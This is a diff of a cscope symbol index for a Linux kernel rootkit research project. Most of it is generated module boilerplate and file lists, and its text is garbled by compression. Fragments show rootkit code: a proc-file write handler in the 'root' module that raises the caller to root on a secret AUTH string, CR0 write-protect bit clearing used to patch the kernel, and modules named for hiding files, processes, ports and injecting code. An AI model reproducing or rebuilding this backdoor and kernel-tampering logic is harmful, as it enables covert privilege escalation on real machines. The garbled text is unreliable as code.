@@ -1,4 +1,4 @@
-cscope 15 $HOME/tools/research-rootkit               0000460651
+cscope 15 $HOME/tools/research-rootkit               0000463129
 	@1-sys_call_table/fshid/fshid.c
 
 22 
@@ -669,6 +669,104 @@ dfd
 	}
 }
 
+	@1-sys_call_table/fsmon/fsmonko.mod.c
+
+1 
+	~<lšux/moduË.h
+>
+
+2 
+	~<lšux/v”magic.h
+>
+
+3 
+	~<lšux/compž”.h
+>
+
+5 
+MODULE_INFO
+(
+v”magic
+, 
+VERMAGIC_STRING
+);
+
+7 
+moduË
+ 
+__this_moduË
+
+
+8 
+__©Œibu‹__
+((
+£ùiÚ
+(".gnu.linkonce.this_module"))) = {
+
+9 .
+Çme
+ = 
+KBUILD_MODNAME
+,
+
+10 .
+	gš™
+ = 
+š™_moduË
+,
+
+11 #ifdeà
+CONFIG_MODULE_UNLOAD
+
+
+12 .
+	gex™
+ = 
+þ—nup_moduË
+,
+
+14 .
+	g¬ch
+ = 
+MODULE_ARCH_INIT
+,
+
+17 cÚ¡ 
+modv”siÚ_šfo
+ 
+	g____v”siÚs
+[]
+
+18 
+__u£d
+
+
+19 
+__©Œibu‹__
+((
+£ùiÚ
+("__versions"))) = {
+
+39 cÚ¡ 
+	g__moduË_d•’ds
+[]
+
+40 
+__u£d
+
+
+41 
+__©Œibu‹__
+((
+£ùiÚ
+(".modinfo"))) =
+
+45 
+MODULE_INFO
+(
+¤cv”siÚ
+, "0263E17E760A1BC0339ACAD");
+
 	@1-sys_call_table/hello/hello.c
 
 22 #iâdeà
@@ -1023,6 +1121,104 @@ PAGE_OFFSET
 	}
 }
 
+	@1-sys_call_table/sys_call_table/sys_call_tableko.mod.c
+
+1 
+	~<lšux/moduË.h
+>
+
+2 
+	~<lšux/v”magic.h
+>
+
+3 
+	~<lšux/compž”.h
+>
+
+5 
+MODULE_INFO
+(
+v”magic
+, 
+VERMAGIC_STRING
+);
+
+7 
+moduË
+ 
+__this_moduË
+
+
+8 
+__©Œibu‹__
+((
+£ùiÚ
+(".gnu.linkonce.this_module"))) = {
+
+9 .
+Çme
+ = 
+KBUILD_MODNAME
+,
+
+10 .
+	gš™
+ = 
+š™_moduË
+,
+
+11 #ifdeà
+CONFIG_MODULE_UNLOAD
+
+
+12 .
+	gex™
+ = 
+þ—nup_moduË
+,
+
+14 .
+	g¬ch
+ = 
+MODULE_ARCH_INIT
+,
+
+17 cÚ¡ 
+modv”siÚ_šfo
+ 
+	g____v”siÚs
+[]
+
+18 
+__u£d
+
+
+19 
+__©Œibu‹__
+((
+£ùiÚ
+("__versions"))) = {
+
+39 cÚ¡ 
+	g__moduË_d•’ds
+[]
+
+40 
+__u£d
+
+
+41 
+__©Œibu‹__
+((
+£ùiÚ
+(".modinfo"))) =
+
+45 
+MODULE_INFO
+(
+¤cv”siÚ
+, "E363FFD63FAF3498F568688");
+
 	@1-sys_call_table/write_protection/write_protection.c
 
 22 
@@ -1064,7 +1260,7 @@ MODULE_LICENSE
 ("Old: %d\n", 
 	`‹¡_b™
 (
-X86_CR0_WP_BIT
+X86_CR0_WP
 , &
 ü0
 ));
@@ -1084,7 +1280,7 @@ X86_CR0_WP_BIT
 ("New: %d\n", 
 	`‹¡_b™
 (
-X86_CR0_WP_BIT
+X86_CR0_WP
 , &
 ü0
 ));
@@ -1104,7 +1300,7 @@ X86_CR0_WP_BIT
 ("Now: %d\n", 
 	`‹¡_b™
 (
-X86_CR0_WP_BIT
+X86_CR0_WP
 , &
 ü0
 ));
@@ -1124,6 +1320,104 @@ X86_CR0_WP_BIT
 59 
 	}
 }
+
+	@1-sys_call_table/write_protection/write_protectionko.mod.c
+
+1 
+	~<lšux/moduË.h
+>
+
+2 
+	~<lšux/v”magic.h
+>
+
+3 
+	~<lšux/compž”.h
+>
+
+5 
+MODULE_INFO
+(
+v”magic
+, 
+VERMAGIC_STRING
+);
+
+7 
+moduË
+ 
+__this_moduË
+
+
+8 
+__©Œibu‹__
+((
+£ùiÚ
+(".gnu.linkonce.this_module"))) = {
+
+9 .
+Çme
+ = 
+KBUILD_MODNAME
+,
+
+10 .
+	gš™
+ = 
+š™_moduË
+,
+
+11 #ifdeà
+CONFIG_MODULE_UNLOAD
+
+
+12 .
+	gex™
+ = 
+þ—nup_moduË
+,
+
+14 .
+	g¬ch
+ = 
+MODULE_ARCH_INIT
+,
+
+17 cÚ¡ 
+modv”siÚ_šfo
+ 
+	g____v”siÚs
+[]
+
+18 
+__u£d
+
+
+19 
+__©Œibu‹__
+((
+£ùiÚ
+("__versions"))) = {
+
+39 cÚ¡ 
+	g__moduË_d•’ds
+[]
+
+40 
+__u£d
+
+
+41 
+__©Œibu‹__
+((
+£ùiÚ
+(".modinfo"))) =
+
+45 
+MODULE_INFO
+(
+¤cv”siÚ
+, "FC5BB990BDFBA989C6B88FE");
 
 	@2-fundamentals/fshid/fshid.c
 
@@ -2747,25 +3041,27 @@ NULL
 	$þ—nup_moduË
 ()
 
-68 
-	`´oc_»move
+69 
+	`»move_´oc_’Œy
 (
-’Œy
+NAME
+,
+NULL
 );
 
-70 
+71 
 	`fm_®”t
 ("%s\n", "Farewellhe World!");
 
-72 
+73 
 	}
 }
 
-75 
+76 
 ssize_t
 
 
-76 
+77 
 	$wr™e_hªdËr
 (
 fže
@@ -2777,7 +3073,7 @@ __u£r
 buff
 ,
 
-77 
+78 
 size_t
  
 couÁ
@@ -2787,15 +3083,15 @@ loff_t
 ofå
 )
 
-79 *
+80 *
 kbuff
 ;
 
-80 
+81 
 üed
 * cred;
 
-83 
+84 
 kbuff
  = 
 	`km®loc
@@ -2805,15 +3101,15 @@ couÁ
 GFP_KERNEL
 );
 
-84 ià(!
+85 ià(!
 kbuff
 ) {
 
-85  -
+86  -
 ENOMEM
 ;
 
-87 ià(
+88 ià(
 	`cÝy_äom_u£r
 (
 kbuff
@@ -2823,23 +3119,23 @@ buff
 couÁ
 )) {
 
-88 
+89 
 	`kä“
 (
 kbuff
 );
 
-89  -
+90  -
 EFAULT
 ;
 
-91 
+92 
 kbuff
 [
 couÁ
 ] = ()0;
 
-93 ià(
+94 ià(
 	`¡¾’
 (
 kbuff
@@ -2847,7 +3143,7 @@ kbuff
 AUTH
 ) &&
 
-94 
+95 
 	`¡ºcmp
 (
 AUTH
@@ -2857,11 +3153,11 @@ kbuff
 couÁ
 ) == 0) {
 
-95 
+96 
 	`fm_®”t
 ("%s\n", "Comrade, I will help you.");
 
-98 
+99 
 üed
  = (üed *)
 	`__sk_üed
@@ -2869,7 +3165,7 @@ couÁ
 cu¼’t
 );
 
-101 
+102 
 üed
 ->
 uid
@@ -2881,7 +3177,7 @@ fsuid
 GLOBAL_ROOT_UID
 ;
 
-102 
+103 
 üed
 ->
 gid
@@ -2893,29 +3189,127 @@ fsgid
 GLOBAL_ROOT_GID
 ;
 
-103 
+104 
 	`fm_®”t
 ("%s\n", "See you!");
 
-105 
+106 
 	`fm_®”t
 ("Al›n, g‘ ouˆoàh”e: %s.\n", 
 kbuff
 );
 
-108 
+109 
 	`kä“
 (
 kbuff
 );
 
-109  
+110  
 couÁ
 ;
 
-110 
+111 
 	}
 }
+
+	@2-fundamentals/root/rootko.mod.c
+
+1 
+	~<lšux/moduË.h
+>
+
+2 
+	~<lšux/v”magic.h
+>
+
+3 
+	~<lšux/compž”.h
+>
+
+5 
+MODULE_INFO
+(
+v”magic
+, 
+VERMAGIC_STRING
+);
+
+7 
+moduË
+ 
+__this_moduË
+
+
+8 
+__©Œibu‹__
+((
+£ùiÚ
+(".gnu.linkonce.this_module"))) = {
+
+9 .
+Çme
+ = 
+KBUILD_MODNAME
+,
+
+10 .
+	gš™
+ = 
+š™_moduË
+,
+
+11 #ifdeà
+CONFIG_MODULE_UNLOAD
+
+
+12 .
+	gex™
+ = 
+þ—nup_moduË
+,
+
+14 .
+	g¬ch
+ = 
+MODULE_ARCH_INIT
+,
+
+17 cÚ¡ 
+modv”siÚ_šfo
+ 
+	g____v”siÚs
+[]
+
+18 
+__u£d
+
+
+19 
+__©Œibu‹__
+((
+£ùiÚ
+("__versions"))) = {
+
+44 cÚ¡ 
+	g__moduË_d•’ds
+[]
+
+45 
+__u£d
+
+
+46 
+__©Œibu‹__
+((
+£ùiÚ
+(".modinfo"))) =
+
+50 
+MODULE_INFO
+(
+¤cv”siÚ
+, "B01DB1EA170B2785EA34126");
 
 	@3-persistence/codeinj/codeinj.c
 
@@ -7317,10 +7711,6 @@ NULL
 ü0
 ;
 
-65 
-	`´“m±_di§bË
-();
-
 66 
 ü0
  = 
@@ -7329,9 +7719,7 @@ NULL
 
 67 
 	`þ—r_b™
-(
-X86_CR0_WP_BIT
-, &
+(16, &
 ü0
 );
 
@@ -7340,10 +7728,6 @@ X86_CR0_WP_BIT
 (
 ü0
 );
-
-69 
-	`´“m±_’abË
-();
 
 72 
 	}
@@ -7357,10 +7741,6 @@ X86_CR0_WP_BIT
 ü0
 ;
 
-81 
-	`´“m±_di§bË
-();
-
 82 
 ü0
  = 
@@ -7369,9 +7749,7 @@ X86_CR0_WP_BIT
 
 83 
 	`£t_b™
-(
-X86_CR0_WP_BIT
-, &
+(16, &
 ü0
 );
 
@@ -7380,10 +7758,6 @@ X86_CR0_WP_BIT
 (
 ü0
 );
-
-85 
-	`´“m±_’abË
-();
 
 88 
 	}
@@ -82028,14 +82402,17 @@ __END_DECLS
 .
 1
 /usr/include
-122
-3422
+126
+3606
 1-sys_call_table/fshid/fshid.c
 1-sys_call_table/fsmon/fsmon.c
+1-sys_call_table/fsmon/fsmonko.mod.c
 1-sys_call_table/hello/hello.c
 1-sys_call_table/psmon/psmon.c
 1-sys_call_table/sys_call_table/sys_call_table.c
+1-sys_call_table/sys_call_table/sys_call_tableko.mod.c
 1-sys_call_table/write_protection/write_protection.c
+1-sys_call_table/write_protection/write_protectionko.mod.c
 2-fundamentals/fshid/fshid.c
 2-fundamentals/kohid/kohid.c
 2-fundamentals/komon/komon.c
@@ -82043,6 +82420,7 @@ __END_DECLS
 2-fundamentals/pshid/pshid.c
 2-fundamentals/pthid/pthid.c
 2-fundamentals/root/root.c
+2-fundamentals/root/rootko.mod.c
 3-persistence/codeinj/codeinj.c
 3-persistence/codeinj/fshid/fshid.c
 3-persistence/elf/lssec.c
